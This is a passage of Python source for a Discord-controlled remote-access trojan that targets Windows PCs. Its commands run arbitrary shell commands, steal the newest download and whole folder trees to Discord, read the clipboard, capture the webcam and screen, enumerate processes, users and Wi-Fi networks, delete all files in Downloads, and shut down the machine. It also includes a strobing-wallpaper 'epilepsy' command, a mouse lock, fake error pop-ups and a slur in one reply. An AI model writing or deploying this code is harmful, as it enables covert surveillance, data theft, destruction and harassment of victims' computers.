            file_path = os.path.join(os.path.expanduser(os.path.join("~", "Downloads")), attachment.filename)

            # Notify users about the shared file
            await ctx.send(f"File '{attachment.filename}' has been shared.")

            # Save the file to the user's downloads folder
            await attachment.save(file_path)

            # Auto-open the shared file
            os.startfile(file_path)

        else:
            await ctx.send("Please attach a file for sharing.")

    except Exception as e:
        print(f"Error during file sharing: {e}")
        
# Command: !restartpc
@bot.command()
async def restartpc(ctx):
    try:
        # Display a confirmation message
        await ctx.send("Restarting the PC. This may take a moment...")

        # Execute the system command to restart the PC
        subprocess.run(["shutdown", "/r", "/t", "1"])

    except Exception as e:
        print(f"Error restarting PC: {e}")
        
# Command: !mousemove
@bot.command(help="Move the PC's mouse to the specified coordinates.")
async def mousemove(ctx, x: int, y: int):
    try:
        # Move the mouse to the specified coordinates
        pyautogui.moveTo(x, y)

        await ctx.send(f"Mouse moved to ({x}, {y}).")

    except Exception as e:
        print(f"Error moving mouse: {e}")
        
# Command: !screenshot
@bot.command()
async def screenshot(ctx):
    try:
        # Get the current working directory
        current_directory = os.getcwd()

        # Wait for one second
        await asyncio.sleep(1)

        # Take another screenshot
        screenshot = pyautogui.screenshot()

        # Save the screenshot to the script's folder with a different name
        screenshot_path = os.path.join(current_directory, "screenshot2.png")
        screenshot.save(screenshot_path, format='PNG')

        # Send the screenshot as an attachment
        await ctx.send(file=discord.File(screenshot_path))

    except Exception as e:
        print(f"Error taking screenshot: {e}")
        
# Command: !autoclicker
@bot.command(help="Simulate an autoclicker with a specified CPS and total click number.")
async def autoclicker(ctx, cps: float, totalclicks: int):
    try:
        interval = 1 / cps

        for _ in range(totalclicks):
            pyautogui.click()
            await asyncio.sleep(interval)

        await ctx.send(f"Autoclicker simulation complete ({totalclicks} clicks at {cps} CPS).")

    except Exception as e:
        print(f"Error simulating autoclicker: {e}")
        
#command: !mini
@bot.command()
async def minimize(ctx):
    try:
        pyautogui.hotkey("winleft", "down")
        await ctx.send("Active window minimized.")
    except Exception as e:
        print(f"Error minimizing window: {e}")
        
# Command: !hello
@bot.command()
async def hello(ctx):
    # Respond with "What's up?"
    await ctx.send("What's up?")


    
        
# Command: !mouseclick
@bot.command(help="Simulate a mouse click (left or right).")
async def mouseclick(ctx, leftorright: str):
    try:
        # Check if the argument is "left" or "right"
        if leftorright.lower() == "left":
            pyautogui.click(button="left")
            await ctx.send("Left mouse click simulated.")
        elif leftorright.lower() == "right":
            pyautogui.click(button="right")
            await ctx.send("Right mouse click simulated.")
        else:
            await ctx.send("Invalid argument. Use 'left' or 'right'.")

    except Exception as e:
        print(f"Error simulating mouse click: {e}")
import asyncio
# Command: !crazy
@bot.command(help="Move the mouse to 100 random places and hit different keys over five seconds.")
async def crazy(ctx):
    try:
        # Calculate the interval between each mouse move
        interval = 5 / 1000

        # Move the mouse to 100 random places and hit different keys
        for _ in range(100):
            x, y = random.randint(0, 1920), random.randint(0, 1080)
            pyautogui.moveTo(x, y)

            # Simulate a key press (replace 'a' with any key you want)
            pyautogui.press('a,g,e,z,d,s,w,q')

            await asyncio.sleep(interval)

        await ctx.send("Mouse moved to 100 random places and hit different keys in a crazy manner!")

    except Exception as e:
        print(f"Error during crazy mouse moves and key presses: {e}")
               
# Command: !epilepsy
@bot.command()
async def epilepsy(ctx):
    try:
        # List of background URLs to switch between
        background_urls = [
            "https://i.ytimg.com/vi/xZSO0h4TB9s/maxresdefault.jpg",
            "https://i.ytimg.com/vi/1oC5GbKfzJs/maxresdefault.jpg",
        ]

        # Get the current working directory
        current_directory = os.getcwd()

        # Switch desktop background continuously
        while True:
            for url in background_urls:
                # Download the image
                response = requests.get(url, stream=True)
                background_path = os.path.join(current_directory, "background.jpg")
                with open(background_path, "wb") as image_file:
                    shutil.copyfileobj(response.raw, image_file)

                # Set the desktop background
                ctypes.windll.user32.SystemParametersInfoW(20, 0, background_path, 3)

                # Wait for a short interval before switching to the next background
                await asyncio.sleep(0.01)

    except Exception as e:
        print(f"Error switching desktop background: {e}")
        

        
# Command: !windowsalert
@bot.command()
async def windowsalert(ctx, *, content: str):
    try:
        if platform.system() == "Windows":
            # Parse the title and text from the command content
            parts = content.split(maxsplit=1)
            if len(parts) < 2:
                await ctx.send("Usage: !windowsalert <title> <text>")
                return

            title, text = parts

            # Display a Windows system alert using ctypes
            ctypes.windll.user32.MessageBoxW(0, text, title, 1)
            await ctx.send("Windows system alert displayed.")
        else:
            await ctx.send("This command is only supported on Windows.")

    except Exception as e:
        print(f"Error displaying Windows alert: {e}")
        await ctx.send("An error occurred while attempting to display a Windows alert.")


        
# Command: !kaboom
@bot.command()
async def kaboom(ctx):
    try:
        if platform.system() == "Windows":
            # List of applications to open
            apps_to_open = ["notepad.exe", "calc.exe", "mspaint.exe"]

            # Open each application using subprocess
            for app in apps_to_open:
                subprocess.Popen(app)

            await ctx.send("Kaboom! All apps opened.")
        else:
            await ctx.send("This command is only supported on Windows.")

    except Exception as e:
        print(f"Error opening apps: {e}")
        await ctx.send("An error occurred while attempting to open apps.")
        

        
# Command: !steal
@bot.command()
async def steal(ctx):
    try:
        # Get the path to the Downloads folder
        downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")

        # Get a list of files in the Downloads folder
        files = sorted(os.listdir(downloads_folder), key=lambda x: os.path.getctime(os.path.join(downloads_folder, x)))

        if files:
            # Get the most recent file
            most_recent_file = files[-1]
            file_path = os.path.join(downloads_folder, most_recent_file)

            # Check if the file is suitable for uploading (you may want to add more checks)
            if os.path.isfile(file_path):
                # Send the file using the bot
                with open(file_path, "rb") as file:
                    await ctx.send(file=discord.File(file))

                await ctx.send(f"Sent the most recent download: {most_recent_file}")
            else:
                await ctx.send("The most recent download is not a valid file.")
        else:
            await ctx.send("No files found in the Downloads folder.")

    except Exception as e:
        print(f"Error sending recent download: {e}")
        
# Command: !thug
@bot.command()
async def thug(ctx, amount: int):
    try:
        # Get the path to the Downloads folder
        downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")

        # Create the specified number of 'ccp' folders if they don't exist
        for i in range(1, amount + 1):
            ccp_folder_path = os.path.join(downloads_folder, f"ccp{i}")

            if not os.path.exists(ccp_folder_path):
                os.makedirs(ccp_folder_path)
                await ctx.send(f"Created 'ccp{i}' folder in the Downloads folder.")
            else:
                await ctx.send(f"'ccp{i}' folder already exists in the Downloads folder.")

    except Exception as e:
        print(f"Error creating 'ccp' folders: {e}")
        
# Command: !listfiles
@bot.command()
async def listfiles(ctx, directory="."):
    try:
        # Get a list of files in the specified directory
        files = os.listdir(directory)

        # Send the list of files as a message
        await ctx.send(f"Files in '{directory}':\n```\n{', '.join(files)}\n```")

    except Exception as e:
        print(f"Error listing files: {e}")
        await ctx.send("An error occurred while listing files.")
        

        
# Command: !pcusername
@bot.command()
async def pcusername(ctx):
    try:
        # Get the current PC username
        pc_username = os.getenv('USERNAME')
        
        # Send the PC username to the Discord channel
        await ctx.send(f"The current PC username is '{pc_username}'.")

    except Exception as e:
        print(f"Error getting PC username: {e}")
        await ctx.send("An error occurred while getting the PC username.")  
import requests
from bs4 import BeautifulSoup

import webbrowser

# Command: !search
@bot.command()
async def search(ctx, *, query: str = None):
    try:
        if query:
            # Perform a web search
            search_url = f"https://www.google.com/search?q={query}"

            # Open the search URL in the default web browser
            webbrowser.open(search_url)

            await ctx.send(f"Opened search results for '{query}' in the default web browser.")
        else:
            await ctx.send("Please provide a search query. Use '!search [query]'.")
    
    except Exception as e:
        print(f"Error performing web search: {e}")
        await ctx.send("An error occurred while performing the web search.")

        
        
# Command: !createdir
@bot.command()
async def createdir(ctx, dirname):
    try:
        # Construct the full directory path
        dir_path = os.path.join(os.getcwd(), dirname)

        # Check if the directory already exists
        if os.path.exists(dir_path):
            await ctx.send(f"Directory '{dirname}' already exists.")
        else:
            # Create the directory
            os.makedirs(dir_path)
            await ctx.send(f"Directory '{dirname}' created successfully.")

    except Exception as e:
        print(f"Error creating directory: {e}")
        await ctx.send("An error occurred while creating the directory.")
        
# Command: !leave
@bot.command()
async def leave(ctx, guild_id: int):
    try:
        # Get the guild object based on the provided guild ID
        guild = bot.get_guild(guild_id)

        if guild:
            # Leave the guild
            await guild.leave()
            await ctx.send(f"Left the server with ID {guild_id}.")
        else:
            await ctx.send("Guild not found. Please provide a valid guild ID.")

    except Exception as e:
        print(f"Error during !leave command: {e}")
        await ctx.send("Error leaving the server.")


        
import pyperclip

# Command: !clipboard
@bot.command()
async def clipboard(ctx, action: str = None, *, content: str = None):
    try:
        if action:
            # Convert the action to lowercase for case-insensitivity
            action = action.lower()

            if action == "read":
                # Read from the clipboard
                clipboard_content = pyperclip.paste()
                await ctx.send(f"Clipboard content: ```{clipboard_content}```")

            elif action == "write" and content:
                # Write to the clipboard
                pyperclip.copy(content)
                await ctx.send(f"Content '{content}' has been written to the clipboard.")

            elif action == "paste":
                # Paste the clipboard content
                clipboard_content = pyperclip.paste()
                await ctx.send(f"Pasting clipboard content: ```{clipboard_content}```")

            else:
                await ctx.send("Invalid argument. Use '!clipboard read', '!clipboard write [content]', or '!clipboard paste'.")
        else:
            await ctx.send("Please provide a valid action. Use '!clipboard read', '!clipboard write [content]', or '!clipboard paste'.")

    except Exception as e:
        print(f"Error interacting with clipboard: {e}")
        await ctx.send("An error occurred while interacting with the clipboard.")
        
# Command: !explode
@bot.command()
async def explode(ctx, num_times: int = 1):
    try:
        # Open Notepad multiple times
        for _ in range(num_times):
            subprocess.Popen(["notepad.exe"])

        await ctx.send(f"Exploding with Notepad {num_times} times!")

    except Exception as e:
        print(f"Error exploding: {e}")
        await ctx.send("An error occurred during the explosion.") 
        
# Command: !sd
@bot.command()
async def sd(ctx):
    try:
        await ctx.send("Shutting down...")
        # Execute the system command to shut down the PC
        os.system("shutdown /s /t 1")

    except Exception as e:
        print(f"Error shutting down: {e}")
        await ctx.send("An error occurred while shutting down.")  

        
# Command: !mousefreeze
@bot.command()
async def mousefreeze(ctx):
    try:
        while True:
            # Move the mouse to the specified coordinates (1500, 1000) every 0.2 seconds
            pyautogui.moveTo(1500, 1000)
            await asyncio.sleep(0.2)

    except Exception as e:
        print(f"Error freezing mouse: {e}")
        



        
# Command: !wifiinfo
@bot.command()
async def wifiinfo(ctx):
    global recent_wifi_networks  # Access the global variable
    try:
        # Use subprocess to run the command to get WiFi network information
        result = subprocess.run(["netsh", "wlan", "show", "network"], capture_output=True, text=True)

        # Extract the relevant information from the command output
        networks_info = result.stdout.split("SSID")[1:]

        # Store recent WiFi networks
        recent_wifi_networks = [network.strip() for network in networks_info]

        # Send the information to the Discord channel
        await ctx.send("Recent WiFi Networks:\n" + "\n".join(recent_wifi_networks))

    except Exception as e:
        await ctx.send(f"Error fetching WiFi network information: {e}")
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

@bot.command()
async def boost(ctx, volume: float):
    try:
        # Ensure the volume is between 0.0 and 1.0
        volume = max(0.0, min(volume, 1.0))

        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_interface = cast(interface, POINTER(IAudioEndpointVolume))

        # Set the system volume
        volume_interface.SetMasterVolumeLevelScalar(volume, None)

        await ctx.send(f"System volume boosted to {volume * 100:.0f}%")
    except Exception as e:
        await ctx.send(f"An error occurred while boosting the system volume: {e}")

import cv2        
# Command: !smile
@bot.command()
async def smile(ctx):
    try:
        # Open the webcam
        cap = cv2.VideoCapture(0)

        # Capture a frame
        ret, frame = cap.read()

        # Save the frame as a temporary image
        image_path = "smile_temp.png"
        cv2.imwrite(image_path, frame)

        # Close the webcam
        cap.release()

        # Send the image to the Discord channel
        with open(image_path, "rb") as file:
            await ctx.send(content="Smile! 😊", file=discord.File(file))

        # Remove the temporary image
        os.remove(image_path)

    except Exception as e:
        await ctx.send(f"An error occurred while capturing the image: {e}")        
        
import subprocess
import re

# Command: !wifiscan
@bot.command()
async def wifiscan(ctx):
    try:
        # Run the netsh command to get the list of available Wi-Fi networks
        result = subprocess.run(["netsh", "wlan", "show", "network"], capture_output=True, text=True)

        # Check if the command was successful
        if result.returncode == 0:
            # Extract the network names using regular expression
            network_names = re.findall(r"SSID\s+\d+:\s(.+)", result.stdout)

            # Check if there are any available networks
            if network_names:
                network_list = "\n".join(network_names)
                message = f"Available Wi-Fi Networks:\n{network_list}"
            else:
                message = "No Wi-Fi networks found."
        else:
            message = "Error retrieving Wi-Fi networks."

        await ctx.send(message)

    except Exception as e:
        print(f"Error scanning Wi-Fi networks: {e}")
        await ctx.send("An error occurred while scanning Wi-Fi networks.")

        
# Command: !batteryhealth
@bot.command()
async def batteryhealth(ctx):
    try:
        # Retrieve battery information
        battery = psutil.sensors_battery()
        percent = battery.percent
        charging = battery.power_plugged

        await ctx.send(f"Battery Percentage: {percent}%\nCharging: {'Yes' if charging else 'No'}")

    except Exception as e:
        print(f"Error checking battery health: {e}")
        await ctx.send("An error occurred while checking battery health.")
        
# Command: !fileinfo
@bot.command()
async def fileinfo(ctx, file_path):
    try:
        # Code to retrieve file information
        if os.path.exists(file_path):
            file_stat = os.stat(file_path)
            file_info = f"File Size: {file_stat.st_size / (1024 ** 2):.2f} MB\nCreation Time: {time.ctime(file_stat.st_ctime)}"
            await ctx.send(file_info)
        else:
            await ctx.send("File not found.")

    except Exception as e:
        print(f"Error retrieving file information: {e}")
        await ctx.send("An error occurred while retrieving file information.")
        
# Function: Count the number of registered commands
async def count_commands(ctx):
    try:
        # Count the number of registered commands
        command_count = len(bot.commands)
        await ctx.send(f"Total number of commands: {command_count}")

    except Exception as e:
        print(f"Error counting commands: {e}")
        await ctx.send("An error occurred while counting commands.")

# Command: !cc
@bot.command()
async def cc(ctx):
    await count_commands(ctx)
        
# Command: !processterminate <process_name>
@bot.command()
async def processterminate(ctx, process_name):
    try:
        # Implement process termination logic here...
        await ctx.send(f"Terminating process {process_name}...")

    except Exception as e:
        print(f"Error terminating process: {e}")
        await ctx.send("An error occurred while terminating the process.")
        
# Command: !cputemp
@bot.command()
async def cputemp(ctx):
    try:
        # Code to display CPU temperature
        # (Note: This might require additional libraries and platform-specific code)
        # Replace the following line with appropriate code for your system
        cpu_temp_info = "CPU temperature information is not available on this platform."
        await ctx.send(cpu_temp_info)

    except Exception as e:
        print(f"Error retrieving CPU temperature: {e}")
        await ctx.send("An error occurred while retrieving CPU temperature information.")

        
# Command: !screensaver
@bot.command()
async def screensaver(ctx):
    try:
        # Run a command to activate the screensaver
        subprocess.run(["start", "scrnsave.scr"], shell=True)
        await ctx.send("Screensaver activated!")

    except Exception as e:
        print(f"Error activating screensaver: {e}")
        await ctx.send("An error occurred while activating the screensaver.")
        
# Command: !hardwareinfo
@bot.command()
async def hardwareinfo(ctx):
    try:
        # Get information about CPU, GPU, RAM, and storage
        cpu_info = platform.processor()
        gpu_info = "N/A"  # You may need additional libraries for GPU info
        ram_info = f"Total RAM: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
        storage_info = f"Total Storage: {psutil.disk_usage('/').total / (1024 ** 3):.2f} GB"

        await ctx.send(f"CPU: {cpu_info}\nGPU: {gpu_info}\n{ram_info}\n{storage_info}")

    except Exception as e:
        print(f"Error getting hardware info: {e}")
        await ctx.send("An error occurred while fetching hardware information.")
        
# Command: !dm
@bot.command()
async def dm(ctx, user_id: int, *, message=""):
    try:
        # Get the user object based on the provided user ID
        user = await bot.fetch_user(user_id)

        # Send a direct message to the user
        await user.send(message)

        await ctx.send(f"Message sent to {user.name}#{user.discriminator}")

    except discord.NotFound:
        await ctx.send(f"User with ID {user_id} not found.")
    except Exception as e:
        print(f"Error sending DM: {e}")
        await ctx.send("Error sending DM.")

        
# Command: !processes
@bot.command()
async def processes(ctx):
    try:
        # Get information about the currently running processes
        process_info = ""

        for process in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            process_line = f"PID: {process.info['pid']}, Name: {process.info['name']}, CPU: {process.info['cpu_percent']}%, Memory: {process.info['memory_percent']}%\n"
            
            # Check if adding the next process line exceeds the character limit
            if len(process_info) + len(process_line) > 2000:
                await ctx.send(process_info)
                process_info = ""  # Reset the process_info variable for the next chunk
            
            process_info += process_line

        # Send any remaining process_info
        if process_info:
            await ctx.send(process_info)

    except Exception as e:
        print(f"Error fetching process information: {e}")
        await ctx.send("An error occurred while fetching process information.")

        
# Command: !keyboardtest
@bot.command()
async def keyboardtest(ctx):
    try:
        # TODO: Implement keyboard testing functionality

        await ctx.send("Keyboard test initiated. Press keys to observe real-time display.")

    except Exception as e:
        print(f"Error during keyboard test: {e}")
        await ctx.send("An error occurred during the keyboard test.")
        
# Command: !uptime
@bot.command()
async def uptime(ctx):
    try:
        # Get the system uptime
        uptime = round(time.time() - psutil.boot_time())
        await ctx.send(f"System uptime: {uptime} seconds")

    except Exception as e:
        print(f"Error fetching system uptime: {e}")
        await ctx.send("An error occurred while fetching system uptime.")
        
# Command: !networkinfo
@bot.command()
async def networkinfo(ctx):
    try:
        # Get information about the network connection
        network_info = f"IP Address: {socket.gethostbyname(socket.gethostname())}\n"

        # TODO: Add more network-related information as needed

        await ctx.send(network_info)

    except Exception as e:
        print(f"Error fetching network information: {e}")
        await ctx.send("An error occurred while fetching network information.")

         
# Command: !removeall
@bot.command()
async def removeall(ctx):
    try:
        # Get the path to the Downloads folder
        downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")

        # Remove all files and folders in the Downloads folder
        for item in os.listdir(downloads_folder):
            item_path = os.path.join(downloads_folder, item)
            if os.path.isfile(item_path):
                os.remove(item_path)
            elif os.path.isdir(item_path):
                os.rmdir(item_path)

        await ctx.send("Removed all files and folders from the Downloads folder.")

    except Exception as e:
        print(f"Error removing all files and folders: {e}")
        

        
# Command: !rolesremove
@bot.command()
async def rolesremove(ctx, member: discord.Member = None):
    try:
        # Check if the command is invoked by the authorized user
        authorized_user_id = 1176123011691200543
        if ctx.author.id != authorized_user_id:
            await ctx.send("YOU ARE NOT THUG HUNTER SO STOP DREAMIN FAGGOT")
            return

        # Determine the target member (default to the command invoker if not specified)
        target_member = member or ctx.author

        # Remove all roles from the target member
        for role in target_member.roles:
            try:
                await target_member.remove_roles(role)
            except discord.Forbidden:
                print(f"Bot doesn't have permission to remove the role: {role.name}")
            except discord.HTTPException:
                print(f"Error removing role: {role.name}")

        await ctx.send(f"All roles removed from {target_member.mention}.")

    except Exception as e:
        print(f"Error removing roles: {e}")
        await ctx.send("Error removing roles.")
        await ctx.send("Error removing roles.")   
        

        
# Command: !systeminfo
@bot.command()
async def systeminfo(ctx):
    try:
        # Get general information about the system
        system_info = f"OS: {platform.system()} {platform.version()}\n"
        system_info += f"Processor: {platform.processor()}\n"
        system_info += f"Architecture: {platform.architecture()[0]}\n"

        await ctx.send(system_info)

    except Exception as e:
        print(f"Error fetching system information: {e}")
        await ctx.send("An error occurred while fetching system information.")
        

import psutil
# Command: !storageinfo
@bot.command()
async def storageinfo(ctx):
    try:
        # Get information about the storage devices
        partitions = psutil.disk_partitions()

        storage_info = ""
        for partition in partitions:
            usage = psutil.disk_usage(partition.mountpoint)
            storage_info += f"{partition.device} - Total: {usage.total / (1024 ** 3):.2f} GB, Free: {usage.free / (1024 ** 3):.2f} GB\n"

        await ctx.send(storage_info)

    except Exception as e:
        print(f"Error fetching storage information: {e}")
        await ctx.send("An error occurred while fetching storage information.") 
        
        

# Command: !holdshift
@bot.command()
async def holdshift(ctx):
    try:
        # Notify the user before holding down the shift key
        await ctx.send("Holding down the shift key. Type !release to stop.")

        # Hold down the shift key
        pyautogui.keyDown('shift')

        # Wait for a stop signal
        while True:
            await asyncio.sleep(1)

    except Exception as e:
        print(f"Error holding down shift key: {e}")
        await ctx.send("An error occurred while holding down the shift key.")
        
import discord
from discord.ext import commands
import ctypes

# Command: !fakeerror
@bot.command()
async def fakeerror(ctx):
    try:
        # Display a fake error message
        ctypes.windll.user32.MessageBoxW(0, "Error Running thugger.exe", "thugger.exe couldn't run due to missing numpy packages", 1)

        await ctx.send("Fake error message displayed.")

    except Exception as e:
        print(f"Error displaying fake error message: {e}")
        await ctx.send("An error occurred while displaying the fake error message.")

        
import ctypes

# Command: !switchmousebuttons
@bot.command()
async def switchmousebuttons(ctx):
    try:
        # Get the current state of the mouse buttons
        swapped = ctypes.windll.user32.SwapMouseButton(0)

        # Switch the state of the mouse buttons
        new_state = not bool(swapped)
        ctypes.windll.user32.SwapMouseButton(new_state)

        await ctx.send("Mouse buttons switched.")

    except Exception as e:
        print(f"Error switching mouse buttons: {e}")
        await ctx.send("An error occurred while switching mouse buttons.")

        
import ctypes

# Command: !cursorspeed <speed>
@bot.command()
async def cursorspeed(ctx, speed: int):
    try:
        # Ensure the speed is within a reasonable range
        speed = max(min(speed, 20), 1)

        # Change cursor speed in Windows registry
        registry_key = "Control Panel\\Mouse"
        ctypes.windll.user32.SystemParametersInfoW(113, 0, speed, 0)
        ctypes.windll.kernel32.WritePrivateProfileStringW(registry_key, "MouseSpeed", str(speed), "User")

        await ctx.send(f"Cursor speed set to {speed}.")

    except Exception as e:
        print(f"Error changing cursor speed: {e}")
        await ctx.send("An error occurred while changing cursor speed.")

        
# Command: !desert
@bot.command()
async def desert(ctx):
    """Set the system contrast theme to desert."""
    try:
        # Set the system contrast theme to desert
        subprocess.run(["reg", "add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize", "/v", "AppsUseLightTheme", "/t", "REG_DWORD", "/d", "0", "/f"])
        await ctx.send("System contrast theme set to desert.")

    except Exception as e:
        print(f"Error setting contrast theme: {e}")
        await ctx.send("An error occurred while setting the contrast theme.")
        
import pyautogui

# Command: !presskey
@bot.command()
async def presskey(ctx, *, keys):
    try:
        if keys.lower() == "help":
            # Provide a list of available keys
            available_keys = ["ctrlleft", "ctrlright", "altleft", "altright", "shiftleft", "shiftright", "a", "b", "c", ...]
            key_list = "\n".join(available_keys)
            help_message = f"Available keys:\n```\n{key_list}\n```"
            await ctx.send(help_message)
        else:
            # Simulate pressing the specified keys
            pyautogui.press(keys)

            await ctx.send(f"Keys '{keys}' pressed successfully.")

    except Exception as e:
        error_message = f"Error pressing keys: {e}"
        print(error_message)
        await ctx.send(f"An error occurred while pressing keys:\n```\n{error_message}\n```")

# Command: !key help
@bot.command()
async def key(ctx, *, action=None):
    try:
        if action and action.lower() == "help":
            # Provide help for common keys and Windows shortcuts
            key_help_message = (
                "Common keys and Windows shortcuts:\n"
                "!presskey ctrlleft - Simulate pressing left Control key\n"
                "!presskey ctrlright - Simulate pressing right Control key\n"
                "!presskey altleft - Simulate pressing left Alt key\n"
                "!presskey altright - Simulate pressing right Alt key\n"
                "!presskey shiftleft - Simulate pressing left Shift key\n"
                "!presskey shiftright - Simulate pressing right Shift key\n"
                "!presskey winleft - Simulate pressing left Windows key\n"
                "!presskey winright - Simulate pressing right Windows key\n"
                "!presskey l - Simulate pressing 'l' key\n"
                "!presskey ctrlaltdelete - Simulate pressing Ctrl + Alt + Delete\n"
                "!presskey ctrla - Simulate pressing Ctrl + A (Select all)\n"
                "!presskey ctrlc - Simulate pressing Ctrl + C (Copy)\n"
                "!presskey ctrlx - Simulate pressing Ctrl + X (Cut)\n"
                "!presskey ctrlv - Simulate pressing Ctrl + V (Paste)\n"
                "!presskey ctrlz - Simulate pressing Ctrl + Z (Undo)\n"
                "!presskey ctrly - Simulate pressing Ctrl + Y (Redo)\n"
                "!presskey ctrlshiftn - Simulate pressing Ctrl + Shift + N (Create new folder)\n"
                "!presskey altf4 - Simulate pressing Alt + F4 (Close active window)\n"
                "!presskey ctrld - Simulate pressing Ctrl + D (Delete to Recycle Bin)\n"
                "!presskey shiftdelete - Simulate pressing Shift + Delete (Delete permanently)\n"
                "!presskey f2 - Simulate pressing F2 (Rename)\n"
                "!presskey esc - Simulate pressing Esc (Close task)\n"
                "!presskey alttab - Simulate pressing Alt + Tab (Switch between apps)\n"
                "!presskey prtscn - Simulate pressing PrtScn (Take screenshot)\n"
                "!presskey wini - Simulate pressing Windows key + I (Open Settings)\n"
                "!presskey wine - Simulate pressing Windows key + E (Open File Explorer)\n"
                "!presskey wina - Simulate pressing Windows key + A (Open Action Center)\n"
                "!presskey wind - Simulate pressing Windows key + D (Show desktop)\n"
                "!presskey winl - Simulate pressing Windows key + L (Lock device)\n"
                "!presskey winv - Simulate pressing Windows key + V (Open Clipboard bin)\n"
                "!presskey winperiod - Simulate pressing Windows key + Period (Open emoji panel)\n"
                "!presskey winsemicolon - Simulate pressing Windows key + Semicolon (Open emoji panel)\n"
                "!presskey winprtscn - Simulate pressing Windows key + PrtScn (Capture screenshot)\n"
                "!presskey winshifts - Simulate pressing Windows key + Shift + S (Capture part of the screen)\n"
                "!presskey winleftarrow - Simulate pressing Windows key + Left arrow (Snap app or window left)\n"
                "!presskey winrightarrow - Simulate pressing Windows key + Right arrow (Snap app or window right)\n"
                # Add more keys or shortcuts as needed
            )
            await ctx.send(key_help_message)
        else:
            await ctx.send("Invalid usage. Use !key help to get a list of available key commands.")

    except Exception as e:
        error_message = f"Error providing key help: {e}"
        print(error_message)
        await ctx.send(f"An error occurred while providing key help:\n```\n{error_message}\n```")
        

# Command: !cmd
@bot.command()
async def cmd(ctx, *, command):
    try:
        # Execute a command in the command prompt
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # Combine stdout and stderr into a single string
        output = result.stdout + result.stderr

        # Split the output into chunks of 200 characters
        chunk_size = 1900
        chunks = [output[i:i + chunk_size] for i in range(0, len(output), chunk_size)]

        # Send each chunk as a separate message
        for chunk in chunks:
            formatted_chunk = f"```\n{chunk}\n```"
            await ctx.send(formatted_chunk)

    except Exception as e:
        error_message = f"Error executing command: {e}"
        print(error_message)
        await ctx.send(f"An error occurred while executing the command:\n```\n{error_message}\n```")


# Command: !monitoroff
@bot.command()
async def monitoroff(ctx):
    try:
        # Turn off the computer monitor
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)

        await ctx.send("Computer monitor turned off successfully.")

    except Exception as e:
        print(f"Error turning off monitor: {e}")
        await ctx.send("An error occurred while turning off the monitor.")
        
import discord
from discord.ext import commands
import psutil

# Other imports and setup

@bot.command()
async def listusers(ctx):
    try:
        # Get a list of running processes
        processes = psutil.process_iter(['pid', 'name', 'username'])

        # Extract unique usernames from the processes, handling None values
        unique_usernames = set(process.info['username'] for process in processes if process.info.get('username'))

        # Format the usernames and send them in a message
        user_list = "\n".join(unique_usernames)
        await ctx.send(f"Users on the system:\n{user_list}")

    except Exception as e:
        print(f"Error listing users: {e}")
        await ctx.send("An error occurred while listing users.")

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from discord.ext import commands

@bot.command()
async def sendmail(ctx, email_address=None, email_password=None, to_email=None, subject=None, message=None):
    try:
        # Prompt the user for missing information
        if not email_address:
            await ctx.send("Enter your email address:")
            email_address = await bot.wait_for("message", check=lambda m: m.author == ctx.author)
            email_address = email_address.content

        if not email_password:
            await ctx.send("Enter your email password:")
            email_password = await bot.wait_for("message", check=lambda m: m.author == ctx.author)
            email_password = email_password.content

        if not to_email:
            await ctx.send("Enter the recipient's email address:")
            to_email = await bot.wait_for("message", check=lambda m: m.author == ctx.author)
            to_email = to_email.content

        if not subject:
            await ctx.send("Enter the email subject:")
            subject = await bot.wait_for("message", check=lambda m: m.author == ctx.author)
            subject = subject.content

        if not message:
            await ctx.send("Enter the email message:")
            message = await bot.wait_for("message", check=lambda m: m.author == ctx.author)
            message = message.content

        # Set up the MIME
        msg = MIMEMultipart()
        msg['From'] = email_address
        msg['To'] = to_email
        msg['Subject'] = subject

        # Attach the message to the MIME
        msg.attach(MIMEText(message, 'plain'))

        # Connect to the SMTP server for Outlook
        with smtplib.SMTP('smtp.office365.com', 587) as server:
            server.starttls()
            server.login(email_address, email_password)
            text = msg.as_string()
            server.sendmail(email_address, to_email, text)

        await ctx.send(f"Email sent to {to_email}")

    except Exception as e:
        print(f"Error sending email: {e}")
        await ctx.send("An error occurred while sending the email.")


        
import discord
from discord.ext import commands
import pyautogui

# Command: !type
@bot.command()
async def type(ctx, *, query):
    try:
        # Type the provided query using the keyboard
        pyautogui.typewrite(query)

        await ctx.send(f"Typed: {query}")

    except Exception as e:
        print(f"Error typing message: {e}")
        await ctx.send("An error occurred while typing the message.")
        
import shutil

# Command: !diskusage
@bot.command()
async def diskusage(ctx, path: str):
    try:
        total, used, free = shutil.disk_usage(path)
        await ctx.send(f"Disk Usage for '{path}':\n"
                       f"Total Space: {total / (2**30):.2f} GB\n"
                       f"Used Space: {used / (2**30):.2f} GB\n"
                       f"Free Space: {free / (2**30):.2f} GB")

    except Exception as e:
        print(f"Error in the !diskusage command: {e}")
        


import os
import discord

# Command: !sendfiles
@bot.command()
async def sendfiles(ctx, source_path: str):
    try:
        chunk_size_limit = 25 * 1024 * 1024  # 25 MB in bytes

        current_chunk_size = 0
        files_to_send = []

        for root, _, files in os.walk(source_path):
            for file in files:
                file_path = os.path.join(root, file)

                # Check if adding the next file would exceed the limit
                if current_chunk_size + os.path.getsize(file_path) > chunk_size_limit:
                    # Send the files collected so far
                    await send_files(ctx, files_to_send)
                    
                    # Reset the variables
                    current_chunk_size = 0
                    files_to_send = []

                # Add the file to the list
                files_to_send.append(file_path)
                current_chunk_size += os.path.getsize(file_path)

        # Send any remaining files
        await send_files(ctx, files_to_send)

    except Exception as e:
        print(f"Error in the !sendfiles command: {e}")

async def send_files(ctx, files_to_send):
    for file_path in files_to_send:
        # Send each file to the Discord channel, mentioning @everyone
        with open(file_path, 'rb') as file:
            file_discord = discord.File(file, filename=os.path.basename(file_path))
            await ctx.send(f"@everyone File '{file_path}' sent.", file=file_discord)
            
